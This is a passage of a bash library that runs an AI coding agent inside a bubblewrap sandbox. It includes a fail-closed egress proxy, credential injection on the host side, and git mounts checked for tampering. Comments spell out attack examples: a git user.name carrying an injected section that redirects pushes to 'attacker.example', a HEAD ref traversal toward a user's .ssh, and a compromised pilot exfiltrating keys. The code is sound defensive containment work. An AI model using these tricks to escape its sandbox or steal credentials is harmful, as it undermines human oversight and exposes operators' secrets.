        echo "dispatch-lib: pilot_egress_guard.unreachable pilot-egress-proxy failed to bind $_PILOT_EGRESS_SOCK within 3s (pid $proxy_pid) — refusing the dispatch (mika#2049)" >&2
        return 1
    fi
    echo "dispatch-lib: pilot-egress-proxy launched (pid $proxy_pid, log $log_file)" >&2
    return 0
}

# --- mika#2049: the refusal, its stamp, and its escalation -------------------

# The remedy sentence for one motive. The refusal text has to name BOTH the cause
# and the gesture (R2): an operator reading `CONTAINMENT REFUSAL` at 3am needs to
# know which organ to repair, and the two causes call for opposite gestures.
_pilot_egress_remedy() {
    case "$1" in
        "$_PILOT_EGRESS_MOTIF_BINARY_MISSING")
            printf '%s' "The egress relay binary is absent from $_PILOT_EGRESS_PROXY_BIN. Deploy it with \`make install\` on the dispatch host, then re-dispatch."
            ;;
        "$_PILOT_EGRESS_MOTIF_BIND_TIMEOUT")
            printf '%s' "The egress relay did not bind $_PILOT_EGRESS_SOCK within 3s. Restart it with \`scripts/canary-pilot-containment --restart-relay\`, read \${MIKA_PILOT_EGRESS_LOG_DIR:-/var/log/mika}/pilot-egress-proxy.log (or /tmp/mika-pilot-egress-proxy.log) for why it died, then re-dispatch."
            ;;
        *)
            # Unreachable through the two motives above, and deliberately not a
            # silent empty string: a refusal whose remedy is blank sends the
            # operator looking for a bug in the wrong organ.
            printf '%s' "Cause unrecognised by \`_pilot_egress_remedy\` — see the dispatch stderr log, then runbook docs/operator/pilot-egress-relay.md."
            ;;
    esac
}

# Escalate on a channel someone actually reads (R3), deterministically — no LLM
# turn, no prompt instruction (`feedback_prompt_enforcement_empirically_confirmed_at_loop_substrate`).
#
# `|| true` EVERYWHERE, and the order is the point: the refusal is the
# protection, the alert is the information, and an alert that fails must never
# hand the launch back to the pilot.
#
# WHAT THIS CANNOT TELL YOU: `mika notify` returns Ok(()) even when Telegram
# delivery fails — the failure is caught, printed to its own stderr, and
# swallowed (crates/mika-cli/src/commands/notify.rs). Only a DB write failure
# makes it non-zero. So this call site can NEVER know whether the alert reached
# anyone, and no amount of shell here would change that. What makes the channel
# real is a DEPLOYMENT-TIME precondition — the `mika` agent must carry a non-null
# `chat_id` in `customer_config` — checked in the runbook, not on the critical
# path of every dispatch. The notification is written to the DB BEFORE the send
# is attempted, so a dead gateway still leaves the line in session
# 00000000-0000-0000-0000-700000710717; that is what makes halt (c) of the plan
# decidable.
_pilot_egress_notify() {
    local severity="$1" text="$2"
    if ! command -v mika >/dev/null 2>&1; then
        echo "dispatch-lib: \`mika\` not on PATH — egress escalation not emitted: $text" >&2
        return 0
    fi
    mika notify --channel telegram --severity "$severity" --text "$text" >/dev/null 2>&1 || true
    return 0
}

# Record the outage and escalate ONCE per episode (R4).
#
# Deduplication is by the stamp's presence, not by a counter: a proxy outage
# spanning an hour produces one alert, not one per dispatch. The stamp is also
# what gardes A and B read to stop consuming tickets' re-drive budget, which is
# why its CONTENT is read (unlike `auto-pull-stop`, mika#2329, whose content is
# deliberately never read) — the engine needs the age to decide staleness.
_pilot_egress_mark_down() {
    local motif="$1" remedy="$2" was_down=0
    [ -f "$_PILOT_EGRESS_DOWN_STAMP" ] && was_down=1

    mkdir -p "$(dirname "$_PILOT_EGRESS_DOWN_STAMP")" 2>/dev/null || true
    # `<RFC3339-UTC> <motif>`, one line. Written on every refusal (refreshing the
    # timestamp), so the engine's staleness window measures the LAST refusal
    # rather than the first — without that refresh a long outage would look stale
    # after one TTL and gardes A/B would stop biting for the rest of it.
    printf '%s %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$motif" \
        > "$_PILOT_EGRESS_DOWN_STAMP" 2>/dev/null \
        || echo "dispatch-lib: could not write the egress-down stamp at $_PILOT_EGRESS_DOWN_STAMP — the engine will keep consuming tickets' re-drive budget during this outage (mika#2049)" >&2

    if [ "$was_down" -eq 0 ]; then
        _pilot_egress_notify escalate \
            "🚨 Egress relay DOWN — pilot dispatch refused (fail-closed, mika#2049). Cause: $motif. $remedy Tickets are NOT being parked; the loop resumes on its own once the relay serves again."
    fi
}

# The relay serves. If it did not last time, say so and clear the stamp.
#
# An announced resumption is half of R4: a rail that restarts without saying so
# leaves the operator facing a silence they cannot tell from a persistent outage.
# Modelled on `auto_pull_stop_armed` / `auto_pull_stop_lifted` (mika#2329) — a
# transition, never a repeated state.
_pilot_egress_mark_up() {
    [ -f "$_PILOT_EGRESS_DOWN_STAMP" ] || return 0
    rm -f "$_PILOT_EGRESS_DOWN_STAMP" 2>/dev/null || true
    echo "dispatch-lib: pilot_egress_guard.recovered egress relay is serving again — dispatch resumed (mika#2049)" >&2
    _pilot_egress_notify info \
        "✅ Egress relay back up — pilot dispatch resumed (mika#2049). No action needed on tickets."
}

# Passthrough env allowlist: after `--clearenv`, these vars are re-injected
# via `--setenv` when present in the parent env. Deliberately narrow — any
# non-listed var (AWS_*, NPM_TOKEN, ATLASSIAN_API_TOKEN, non-MIKA_
# OPENAI_/ANTHROPIC_, etc.) is DROPPED by --clearenv and does not reach the
# sandbox. `ANTHROPIC_LOG_FILE` is the pilot transcript hook (mika#1705).
# `MIKA_LOG_PILOT_TRANSCRIPTS` gates transcript.
#
# NOTHING SECRET GOES IN THIS LIST (mika#2039). `--setenv NAME VALUE` puts the
# value in bwrap's argv, and /proc/<pid>/cmdline is world-readable — `ps` is
# enough. A secret belongs in _PILOT_SANDBOX_SECRET_ALLOWLIST below.
#
# Audit of every value still reaching `--setenv`, so a future addition is
# weighed rather than assumed (mika#2039 R6):
#   * HOME PATH USER LOGNAME SHELL TERM LANG LC_ALL TMPDIR HOSTNAME
#       — POSIX environment, non-secret by definition.
#   * ANTHROPIC_LOG_FILE, MIKA_LOG_PILOT_TRANSCRIPTS
#       — a path and a boolean gate. No credential material.
#   * the `net_setenv_args` producer below adds HTTPS_PROXY / HTTP_PROXY /
#     NO_PROXY / ANTHROPIC_BASE_URL / CLAUDE_CODE_API_BASE_URL (localhost
#     URLs), MIKA_PILOT_CONTAINED ("1"), NODE_EXTRA_CA_CERTS (a path), and
#     ANTHROPIC_API_KEY. That last one is safe ONLY because it carries the
#     literal placeholder `proxy-managed-no-secret` — the real key is injected
#     host-side by the egress proxy and never crosses the bwrap boundary.
#     Replacing that placeholder with a real key would re-open this defect;
#     scripts/verify-no-secret-in-setenv.sh fails if it ever changes.
_PILOT_SANDBOX_ENV_ALLOWLIST=(
    HOME PATH USER LOGNAME SHELL TERM LANG LC_ALL TMPDIR HOSTNAME
    ANTHROPIC_LOG_FILE MIKA_LOG_PILOT_TRANSCRIPTS
)

# Secret passthrough allowlist (mika#2039). These NEVER travel via `--setenv`.
# Each one is handed to bwrap on a file descriptor and materialised as a 0600
# read-only file under $_PILOT_SECRET_DIR_SANDBOX; $_PILOT_SECRET_PROLOGUE
# re-exports it inside the sandbox.
#
# mika#2056: this list is now EMPTY. `GH_TOKEN` was the sole entry, and it is
# removed — the file channel it used is deleted, not stacked beside the new
# mechanism. The sandbox no longer holds any GitHub credential in its
# environment or on its filesystem; `git push` and the `gh` CLI reach GitHub
# through the egress-proxy MITM, which injects the credential host-side
# (mika-pilot-github-auth-addon.py). This is the same invariant the Anthropic
# key already has — "the sandbox NEVER holds secret material" — now extended to
# GitHub. A compromised in-sandbox dependency can no longer read the PAT,
# exfiltrate it to an allowlisted host, or push to arbitrary repos with it.
#
# The channel MACHINERY below is kept intact and generic (it still fires for
# any name added here) — mika#2039's --ro-bind-data secret-file path is not
# removed, only unused by default. Adding a genuinely sandbox-held secret in
# future is still a one-line change here.
_PILOT_SANDBOX_SECRET_ALLOWLIST=(
)

# mika#2056: stage the current GitHub token host-side for the egress-proxy
# MITM addon to inject. Written 0600 to a host-only path that is NEVER bound
# into the sandbox — the sandbox reaches GitHub through the proxy and never
# holds the token itself. Refreshed on every dispatch so a rotated
# App-installation token reaches the (long-lived, shared) mitmdump daemon: the
# addon mtime-caches this file, exactly as the Anthropic addon mtime-caches the
# CLI-refreshed ~/.claude/.credentials.json.
#
# xtrace is suppressed around the write and restored after — the whole dispatch
# runs under `set -x` with BASH_XTRACEFD, and an unbracketed `printf` of the
# token would otherwise land `+ printf %s <token>` in the trace file that
# _emit_callback tails back to the caller (same discipline as the secret
# block). `printf` is the bash builtin; /usr/bin/printf would put the value in
# an argv. Fail-open: a write failure degrades to the addon's env fallback, it
# never aborts the dispatch.
_stage_pilot_gh_token() {
    local _xtrace_was_on=0
    case "$-" in *x*) _xtrace_was_on=1 ;; esac
    { set +x; } 2>/dev/null
    if [ -n "${GH_TOKEN:-}" ]; then
        mkdir -p "$(dirname "$_PILOT_GH_TOKEN_FILE")" 2>/dev/null || true
        ( umask 077; printf '%s' "$GH_TOKEN" > "$_PILOT_GH_TOKEN_FILE" ) 2>/dev/null || \
            echo "dispatch-lib: could not stage GitHub token to $_PILOT_GH_TOKEN_FILE — github auth injection falls back to the mitmdump process env" >&2
    fi
    if [ "$_xtrace_was_on" -eq 1 ]; then
        set -x
    fi
}

# mika#2141: generate the sandbox's git configuration host-side.
#
# Three things must be written, and each was measured to be independently
# load-bearing — a fix carrying only one or two of them repairs `git status`
# and leaves the pilot unable to deliver, which is the exact shape of the
# defect this ticket closes:
#
#   1. url.insteadOf — the parent repo's remote is `git@github.com:...` (SSH).
#      The sandbox has neither ~/.ssh nor $SSH_AUTH_SOCK, deliberately, so an
#      SSH push cannot work and must not be made to work. The design already
#      aimed at git-over-HTTPS: mika-pilot-github-auth-addon.py injects
#      `Authorization: Basic` for github.com host-side (mika#2056), and the
#      secret prologue already exports GIT_SSL_CAINFO. Only the URL rewrite was
#      missing.
#
#   2. user.name / user.email — these live ONLY in the operator's
#      ~/.gitconfig, which `--tmpfs /home` blanks. Neither the repo config nor
#      /etc/gitconfig carries a [user] section. Without them `git commit` fails
#      with "unable to auto-detect email address" even once the gitdir is
#      mounted. Read from the host at stage time so the pilot's commits carry
#      the same authorship as the operator's.
#
#   3. Nothing else. The file is written from scratch on every dispatch, never
#      appended to and never copied from ~/.gitconfig, so a credential helper
#      added to the operator's config later cannot drift into the sandbox.
#
# Fail-open on a write error (same posture as _stage_pilot_gh_token): the
# dispatch proceeds and git fails loudly inside, rather than the whole dispatch
# dying on a config file.
_stage_pilot_gitconfig() {
    local name email
    name=$(git config --get user.name 2>/dev/null || true)
    email=$(git config --get user.email 2>/dev/null || true)

    # `git config --get` returns real newlines for a stored `\n` escape, and this
    # value is interpolated into a config file. A name of the form
    # `Vincent<newline>[url "https://attacker.example"]<newline>insteadOf = ...`
    # would inject a section that redirects the pilot's push. Reject rather than
    # strip: a control character in a committer name is never legitimate, and a
    # silent strip would hide the tampering.
    case "$name$email" in
        *[[:cntrl:]]*)
            echo "dispatch-lib: host git user.name/user.email contains a control character — refusing to write it into the pilot gitconfig (mika#2141)" >&2
            name=""
            email=""
            ;;
    esac

    mkdir -p "$(dirname "$_PILOT_GITCONFIG_HOST")" 2>/dev/null || true
    {
        printf '[url "https://github.com/"]\n'
        printf '\tinsteadOf = git@github.com:\n'
        printf '\tinsteadOf = ssh://git@github.com/\n'
        if [ -n "$name" ] && [ -n "$email" ]; then
            printf '[user]\n\tname = %s\n\temail = %s\n' "$name" "$email"
        fi
    } > "$_PILOT_GITCONFIG_HOST" 2>/dev/null || {
        echo "dispatch-lib: could not write $_PILOT_GITCONFIG_HOST" >&2
        return 1
    }
    [ -s "$_PILOT_GITCONFIG_HOST" ] || {
        echo "dispatch-lib: $_PILOT_GITCONFIG_HOST is empty after staging" >&2
        return 1
    }
    if [ -z "$name" ] || [ -z "$email" ]; then
        echo "dispatch-lib: host git has no usable user.name/user.email — the pilot cannot commit (mika#2141)" >&2
    fi
    return 0
}

# mika#2141: emit the bwrap arguments that make git usable inside the sandbox.
#
# THE DEFECT. `--bind "$WORKTREE_DIR" "$WORKTREE_DIR"` mounts the worktree and
# nothing else. But a linked worktree's `.git` is not a directory — it is a
# file holding an absolute path into the parent repository:
#
#     gitdir: /data/workspace/mika-platform/mika/.git/worktrees/mika24
#
# That path is outside the bind. It does not exist in the namespace, so git
# finds no gitdir, no commondir and no object store, and EVERY git command
# returns `fatal: not a git repository`. Introduced 2026-08-04 by the
# containment layer (e4f24677 / PR#1894); for the month that followed, no pilot
# could commit and every apparent delivery came through the mika#1282
# wip-rescue net, which commits host-side.
#
# THE SHAPE OF THE FIX. Bind the strict minimum, derived by path — never
# /data/workspace in bulk, which is what the threat model exists to keep out.
# Results are populated into two globals rather than printed, so no path has to
# survive a round-trip through word splitting:
#
#     _PILOT_GITDIR_BIND_ARGS   the bwrap arguments (may be empty)
#     _PILOT_GITDIR_BIND_ABORT  non-empty means: do not launch, explain this
#
# ORDER IS LOAD-BEARING. `--ro-bind refs` comes before the two writable binds
# nested inside it. bwrap applies mounts in argument order, and a bind over an
# existing directory inside a read-only mount succeeds — what fails is bind to
# a path that must first be CREATED there (the Bug B that put the helper CA
# under /tmp). Hence the mkdir below: the mountpoint must exist host-side, and
# `refs/heads/<type>/<issue>/` frequently does not, because 316 refs live in
# packed-refs rather than on disk.
#
# WHAT IS DELIBERATELY NOT BOUND. `hooks/` — the sandbox runs no repo hooks,
# which is narrower and matches the `--no-verify` the rescue path already uses;
# CI remains the real gate. The parent `config` is bound READ-ONLY: it resolves
# the remote (without it the repo has no origin and push is impossible) and
# nothing in the sandbox may rewrite it.
_pilot_gitdir_bind_args() {
    local worktree_dir="$1"
    _PILOT_GITDIR_BIND_ARGS=()
    _PILOT_GITDIR_BIND_ABORT=""

    local dotgit="$worktree_dir/.git"

    # A plain checkout (.git is a directory) is already fully inside the
    # worktree bind — nothing to add. A path with no .git at all is not a
    # repository; the sandbox test harnesses run in exactly that shape, and
    # they must keep working.
    [ -e "$dotgit" ] || return 0
    [ -f "$dotgit" ] || return 0

    # EVERY INPUT BELOW IS ATTACKER-WRITABLE. This function runs HOST-side and
    # decides what gets bind-mounted read-write into the next sandbox, but its
    # inputs live inside the previous sandbox's writable surface: `.git` sits in
    # $WORKTREE_DIR, and `worktrees/<name>/HEAD` is bound rw by this very
    # function. Worktrees persist across dispatches. A pilot that wrote
    # `ref: refs/heads/../../../../home/<user>/.ssh` into HEAD, or repointed the
    # `.git` file, would otherwise have the NEXT dispatch mount an arbitrary
    # host path rw for it. So: resolve through git, which validates the
    # worktree linkage and the refname grammar, and then re-check the results
    # here rather than trusting either layer alone.
    #
    # These three probes run as the operator against a repository the previous
    # sandbox could write, so they are the one place a crafted `include.path` or
    # `core.*` hook would fire host-side. Neutralise system and global config for
    # the probes: they need nothing from either.
    local -a _gitq=(env GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null git --no-optional-locks)
    local wt_gitdir parent_git
    wt_gitdir=$("${_gitq[@]}" -C "$worktree_dir" rev-parse --path-format=absolute --git-dir 2>/dev/null)
    parent_git=$("${_gitq[@]}" -C "$worktree_dir" rev-parse --path-format=absolute --git-common-dir 2>/dev/null)
    if [ -z "$wt_gitdir" ] || [ -z "$parent_git" ]; then
        _PILOT_GITDIR_BIND_ABORT="git cannot resolve a gitdir for $worktree_dir — the worktree is broken or its .git file has been tampered with"
        return 1
    fi
    if ! wt_gitdir=$(cd "$wt_gitdir" 2>/dev/null && pwd) || ! parent_git=$(cd "$parent_git" 2>/dev/null && pwd); then
        _PILOT_GITDIR_BIND_ABORT="the resolved gitdir or common dir does not exist"
        return 1
    fi

    # git's own linkage invariant, asserted explicitly: the parent must know
    # this worktree, and its back-pointer must name this worktree's .git file.
    # A repointed .git that happens to look like a gitdir fails here.
    case "$wt_gitdir" in
        "$parent_git"/worktrees/*) : ;;
        *)
            _PILOT_GITDIR_BIND_ABORT="gitdir '$wt_gitdir' is not registered under '$parent_git/worktrees/' — refusing to mount it"
            return 1
            ;;
    esac
    local backlink=""
    [ -f "$wt_gitdir/gitdir" ] && backlink=$(head -1 "$wt_gitdir/gitdir" 2>/dev/null)
    if [ "$backlink" != "$dotgit" ]; then
        _PILOT_GITDIR_BIND_ABORT="worktree back-pointer mismatch: $wt_gitdir/gitdir names '$backlink', not '$dotgit'"
        return 1
    fi

    # Everything already inside the worktree bind needs no extra mount.
    case "$parent_git/" in
        "$worktree_dir"/*) return 0 ;;
    esac

    _PILOT_GITDIR_BIND_ARGS=(
        --bind "$wt_gitdir" "$wt_gitdir"
        --bind "$parent_git/objects" "$parent_git/objects"
        --ro-bind "$parent_git/refs" "$parent_git/refs"
        --ro-bind "$parent_git/config" "$parent_git/config"
        --ro-bind-try "$parent_git/packed-refs" "$parent_git/packed-refs"
        --ro-bind-try "$parent_git/info" "$parent_git/info"
    )

    # `fetch` updates remote-tracking refs; without this any rebase onto main
    # from inside the sandbox fails on a read-only ref store. Scoped to
    # `origin` rather than all of `refs/remotes`, which was measured to be
    # sufficient: origin's tracking refs stay writable, and a write to any
    # other remote's namespace is refused by the filesystem. Every push path in
    # this library targets origin; a repository with a differently-named remote
    # fails loudly on fetch rather than being handed the whole namespace.
    # Each mkdir below is paired with a NON-try bind, so a failure here becomes
    # `bwrap: Can't find source path` — a launch abort with no explanation. Fail
    # with the reason instead: an unexplained containment abort is the shape
    # that cost this ticket a month of misdirected diagnosis.
    if ! mkdir -p "$parent_git/refs/remotes/origin" 2>/dev/null; then
        _PILOT_GITDIR_BIND_ABORT="cannot create $parent_git/refs/remotes/origin — the bind source must exist before bwrap runs (permissions, or a read-only filesystem)"
        _PILOT_GITDIR_BIND_ARGS=()
        return 1
    fi
    _PILOT_GITDIR_BIND_ARGS+=(--bind "$parent_git/refs/remotes/origin" "$parent_git/refs/remotes/origin")

    # Tags, writable. `git fetch` auto-follows tags reachable from what it
    # fetches, so the first fetch after a release tag lands would otherwise die
    # on `cannot lock ref 'refs/tags/<new>': Read-only file system` — measured —
    # and take the in-sandbox rebase down with it. That is this ticket's own
    # failure shape reappearing one release later. A tag is not a branch head:
    # it is not a push target and the host-side rebase gate does not read it,
    # so the widening buys correctness at a cost the threat model can carry.
    if ! mkdir -p "$parent_git/refs/tags" 2>/dev/null; then
        _PILOT_GITDIR_BIND_ABORT="cannot create $parent_git/refs/tags — the bind source must exist before bwrap runs"
        _PILOT_GITDIR_BIND_ARGS=()
        return 1
    fi
    _PILOT_GITDIR_BIND_ARGS+=(--bind "$parent_git/refs/tags" "$parent_git/refs/tags")

    # The branch head and its reflog. Derived from the worktree's own HEAD, not
    # from the caller's $BRANCH: the guard below must hold for whatever branch
    # is actually checked out, however the worktree was created.
    # Read through git, which enforces the refname grammar, and then re-check
    # the result: this string becomes a path segment under $PARENT_GIT.
    local head_ref=""
    head_ref=$("${_gitq[@]}" -C "$worktree_dir" symbolic-ref --quiet HEAD 2>/dev/null || true)

    # An empty answer means one of two very different things, and they must not
    # be collapsed. A genuinely detached HEAD has no branch ref to update and is
    # fine — commits still work, HEAD lives in the worktree gitdir. A HEAD FILE
    # that says `ref:` while git refuses to resolve it is malformed, which on
    # this attacker-writable surface means tampered. Degrading that to the
    # detached path would be silent: the dispatch would run and the pilot would
    # simply fail to commit, which is the exact failure shape mika#2141 exists
    # to end.
    if [ -z "$head_ref" ] && [ -f "$wt_gitdir/HEAD" ] \
       && grep -q '^ref:' "$wt_gitdir/HEAD" 2>/dev/null; then
        _PILOT_GITDIR_BIND_ABORT="$wt_gitdir/HEAD claims a symbolic ref that git refuses to resolve — the file is malformed or has been tampered with"
        _PILOT_GITDIR_BIND_ARGS=()
        return 1
    fi

    if [ -n "$head_ref" ]; then
        case "$head_ref" in
            refs/heads/*) : ;;
            *)
                _PILOT_GITDIR_BIND_ABORT="HEAD names '$head_ref', which is not under refs/heads/ — refusing to derive a bind path from it"
                _PILOT_GITDIR_BIND_ARGS=()
                return 1
                ;;
        esac
        # Belt and braces over git's own validation. `..` is the one that turns
        # a ref name into a path traversal, and a traversal here is a rw mount
        # of an arbitrary host directory.
        case "$head_ref" in
            *..*|*//*|*$'\n'*)
                _PILOT_GITDIR_BIND_ABORT="HEAD ref '$head_ref' contains a path-traversal or newline sequence — refusing to derive a bind path from it"
                _PILOT_GITDIR_BIND_ARGS=()
                return 1
                ;;
        esac
        # `case`, not `printf | grep -q`: the pipeline form takes SIGPIPE under
        # pipefail and is rejected by scripts/verify-no-sigpipe-grep.sh (mika#2055).
        # The glob rejects the whole string if ANY character falls outside the set.
        case "$head_ref" in
            *[!A-Za-z0-9._/-]*)
                _PILOT_GITDIR_BIND_ABORT="HEAD ref '$head_ref' contains characters outside [A-Za-z0-9._/-] — refusing to derive a bind path from it"
                _PILOT_GITDIR_BIND_ARGS=()
                return 1
                ;;
        esac
    fi

    # Detached HEAD: there is no branch ref to update. Commits still work —
    # HEAD lives in the worktree gitdir, already bound rw above.
    if [ -n "$head_ref" ]; then
        local ref_dir
        ref_dir=$(dirname "$head_ref")
        # A branch with no slash makes dirname() collapse to `refs/heads`, and
        # binding THAT read-write would hand the pilot every head in the
        # repository — the precise opposite of AC2. Abandon the dispatch and say
        # why. Widening silently is the failure this guard exists to prevent.
        if [ "$ref_dir" = "refs/heads" ]; then
            _PILOT_GITDIR_BIND_ABORT="worktree is on branch '${head_ref#refs/heads/}', which has no '/' in its name. Binding its ref directory would grant the sandbox write access to every branch head in the repository (AC2 violation). Dispatch worktrees use <type>/<issue>/<slug>; re-create this one with scripts/derive-branch-name."
            _PILOT_GITDIR_BIND_ARGS=()
            return 1
        fi
        if ! mkdir -p "$parent_git/$ref_dir" "$parent_git/logs/$ref_dir" 2>/dev/null; then
            _PILOT_GITDIR_BIND_ABORT="cannot create $parent_git/$ref_dir or its log directory — the bind source must exist before bwrap runs"
            _PILOT_GITDIR_BIND_ARGS=()
            return 1
        fi
        _PILOT_GITDIR_BIND_ARGS+=(
            --bind "$parent_git/$ref_dir" "$parent_git/$ref_dir"
            --bind "$parent_git/logs/$ref_dir" "$parent_git/logs/$ref_dir"
        )
    fi

    return 0
}

_run_pilot_sandboxed() {
    # Runs "$@" (the full claude-pilot invocation) under bwrap when enabled,
    # or direct-exec otherwise. Preserves stdin/stdout/stderr semantics.
    if ! _pilot_sandbox_enabled; then
        "$@"
        return $?
    fi
    # Version floor (mika#2039): the secret channel uses `--perms` and
    # `--ro-bind-data`, which need bubblewrap >= 0.5.0. This probe only detects
    # bwrap's ABSENCE; an older bwrap is present, passes here, and then fails
    # the launch loudly on an unknown option rather than degrading. That is the
    # safe direction — fail closed, no leak — but it is a hard floor, not a
    # fallback.
    if ! command -v bwrap >/dev/null 2>&1; then
        echo "dispatch-lib: MIKA_PILOT_SANDBOX enabled but bwrap not installed on PATH — falling back to direct invocation" >&2
        "$@"
        return $?
    fi
    # Ensure pilot-transcript dir exists BEFORE the bind — bwrap refuses to
    # bind a source path that doesn't exist. The dir is created on demand by
    # mika#1705 anyway when the first transcript flushes; we create it eagerly
    # here so the bind is stable even on a fresh install.
    mkdir -p "$HOME/.mika/data/pilot-transcripts" 2>/dev/null || true

    # mika#2141: make git usable inside the sandbox. Both halves are required —
    # the binds give git a repository, the config gives it an identity and an
    # HTTPS remote. Either one alone leaves the pilot unable to deliver.
    # $_PILOT_SANDBOX_REFUSAL is deliberately NOT local: bash `local` is invisible
    # to the caller, and the caller is where the operator-facing RESULT is built.
    _PILOT_SANDBOX_REFUSAL=""
    if ! _stage_pilot_gitconfig; then
        # mika#2049: the remedy sentence moved INTO the motive. It used to be a
        # fixed tail on the RESULT block ("Fix the worktree, then re-dispatch."),
        # written for these two gitdir causes and therefore wrong for every other
        # containment refusal — an egress refusal has a healthy worktree and a
        # broken relay. Carrying the remedy here makes the refusal text entirely
        # motive-borne, so the next containment refusal needs no edit to that block.
        _PILOT_SANDBOX_REFUSAL="the sandbox git config could not be staged at $_PILOT_GITCONFIG_HOST, so the pilot would have had no committer identity and no https remote.

Fix the worktree, then re-dispatch."
        echo "dispatch-lib: refusing to launch the pilot — $_PILOT_SANDBOX_REFUSAL (mika#2141)" >&2
        return 78
    fi
    local -a _PILOT_GITDIR_BIND_ARGS=()
    local _PILOT_GITDIR_BIND_ABORT=""
    if ! _pilot_gitdir_bind_args "${WORKTREE_DIR:-}"; then
        # See the sibling above on why the remedy travels with the motive.
        _PILOT_SANDBOX_REFUSAL="$_PILOT_GITDIR_BIND_ABORT

Fix the worktree, then re-dispatch."
        echo "dispatch-lib: refusing to launch the pilot — $_PILOT_SANDBOX_REFUSAL (mika#2141)" >&2
        return 78
    fi

    # mika#2165: the session-log bind. Unlike the gitdir helper this one never
    # refuses the launch — losing the journal must not cost the work — so it
    # returns 0 with an empty arg list and says so on stderr instead.
    local -a _PILOT_LOG_BIND_ARGS=()
    _pilot_log_bind_args

    # Phase 2b: the host-side egress proxy. FAIL-CLOSED since mika#2049 — if the
    # relay does not serve, the dispatch is refused and no pilot is launched.
    local -a net_bwrap_args=()
    local -a net_setenv_args=()
    local sandbox_entrypoint_prefix=""

    # PLACEMENT: above `_stage_pilot_gh_token` and `_ensure_pilot_helper`, hence
    # above TWO side effects rather than one.
    #
    #   * `_stage_pilot_gh_token` refreshes a host GitHub credential on disk. Not
    #     a new leak — the file already lives between two dispatches — but a
    #     credential refreshed for a launch that will not happen.
    #   * `_ensure_pilot_helper` STARTS A DAEMON. A refusal posted after it would
    #     leave one helper started behind every refused dispatch, on every
    #     attempt of an outage.
    #
    # House precedent points the same way: gate 2c of mika#2279 is placed "before
    # step 3, hence with no token resolution".
    #
    # ORDERING CONSTRAINT NOT TO BREAK when moving this: the mika#2056 comment
    # below requires the token to be staged BEFORE the helper, "so the mitmdump
    # github addon has a fresh credential to inject on its very first request".
    # Lifting the refusal above the pair preserves that order intact; inserting
    # it BETWEEN the two would break it.
    if ! _ensure_pilot_egress_proxy; then
        local _egress_motif="${_PILOT_EGRESS_ABORT:-egress_unavailable}"
        local _egress_remedy
        _egress_remedy="$(_pilot_egress_remedy "$_egress_motif")"

        _PILOT_SANDBOX_REFUSAL="the host egress relay is not serving, so the pilot would have run with filesystem containment only and an OPEN NETWORK — which is the posture mika#2049 closed on 2026-09-20 (operator decision: fail-closed, no escape hatch).

Cause: $_egress_motif
Remedy: $_egress_remedy"

        echo "dispatch-lib: refusing to launch the pilot — egress relay unavailable ($_egress_motif) (mika#2049)" >&2

        # Stamp + escalate AFTER the refusal text is built and BEFORE returning,
        # so a failure in either cannot change the verdict. Both are `|| true`
        # internally: the refusal is the protection, the alert is information.
        _pilot_egress_mark_down "$_egress_motif" "$_egress_remedy"

        return 78
    fi

    # The relay serves. If a previous dispatch was refused, this is the
    # resumption — announce it and clear the stamp (R4).
    _pilot_egress_mark_up

    # mika#2056: stage the token host-side BEFORE the helper daemon is ensured,
    # so the mitmdump github addon has a fresh credential to inject on its very
    # first request.
    _stage_pilot_gh_token
    _ensure_pilot_helper || true

    # Unconditional since mika#2049 — the `if _ensure_pilot_egress_proxy; then`
    # that used to guard this block is gone, because its `else` (Phase 2a, network
    # open) no longer exists: the refusal above returns 78 instead.
    #
    # Kept as a brace group rather than de-indented, deliberately: this is the
    # containment shape, and a diff that shows ninety-nine unchanged lines is
    # worth more to a reviewer here than four columns of whitespace. A brace group
    # runs in the CURRENT shell — no subshell — so `net_bwrap_args`,
    # `net_setenv_args` and `sandbox_entrypoint_prefix` are set for the caller
    # exactly as they were under the `if`.
    {
        # Full Phase 2b: unshare-net + bind unix socket + wrap with in-sandbox
        # TCP→unix shim + HTTPS_PROXY pointing at shim.
        net_bwrap_args=(
            --unshare-net
            --bind "$_PILOT_EGRESS_SOCK" "$_PILOT_EGRESS_SOCK"
            --ro-bind "$_PILOT_EGRESS_PROXY_BIN" "$_PILOT_EGRESS_PROXY_BIN"
        )
        if [ -f "$_PILOT_HELPER_CA" ]; then
            # Bind under /tmp (tmpfs) — /etc/ssl/certs is under an already
            # ro-bound /etc so nested binds there fail EROFS (Bug B).
            net_bwrap_args+=(
                --ro-bind "$_PILOT_HELPER_CA" "$_PILOT_HELPER_CA_SANDBOX_PATH"
            )
        fi
        net_setenv_args=(
            --setenv HTTPS_PROXY "http://127.0.0.1:$_PILOT_EGRESS_TCP_PORT"
            --setenv HTTP_PROXY "http://127.0.0.1:$_PILOT_EGRESS_TCP_PORT"
            --setenv NO_PROXY "localhost,127.0.0.1"
            # Exec-si-contenu attestation for cpp (Vincent-ratified 2026-08-04).
            # Only set in Phase 2b full mode (fs+net+kernel cut ALL active).
            # cpp reads this env at classify-time and enables the safe-exec
            # tier1 primitives (node/python3/cargo/npm) SOLELY when this
            # attestation is present. Phase 2a fallback (net open) intentionally
            # does NOT set this — safe-exec stays denied, invariant preserved.
            --setenv MIKA_PILOT_CONTAINED "1"
        )
        # Anthropic auth via HOST-SIDE proxy injection (2026-08-05 — Q3 shape,
        # sami+coherence-ratified). The Phase 2a fs cut hides
        # ~/.claude/.credentials.json (Anthropic OAuth identity token —
        # cred-invariant "no cred in HOME binds"). Without an alternate auth
        # path Claude Code inside the sandbox prints "Not logged in" and
        # exits at 1 turn / $0.
        #
        # Q3 approach: the sandbox NEVER holds an Anthropic secret. Instead:
        #   * mika-pilot-egress-proxy (host-side, outside bwrap) reads the
        #     scoped key MIKA_PILOT_ANTHROPIC_KEY from ~/.mika/.env directly.
        #   * The sandbox points ANTHROPIC_BASE_URL at the proxy's HTTP
        #     reverse-proxy endpoint (localhost / not-CONNECT).
        #   * Claude Code sends unauthenticated HTTP requests to that URL;
        #     the proxy injects `Authorization: Bearer <scoped-key>`
        #     host-side and forwards over TLS to api.anthropic.com.
        #
        # Property: `cat /proc/self/environ` inside the sandbox reveals NO
        # Anthropic secret material, EVER — the key never crosses the bwrap
        # boundary. A pilot fully compromised by a malicious dep cannot
        # exfiltrate the key; the worst case is unauthorized API calls
        # bounded by the scoped key's rate/spend limits.
        #
        # ANTHROPIC_API_KEY is set to a placeholder so Claude Code doesn't
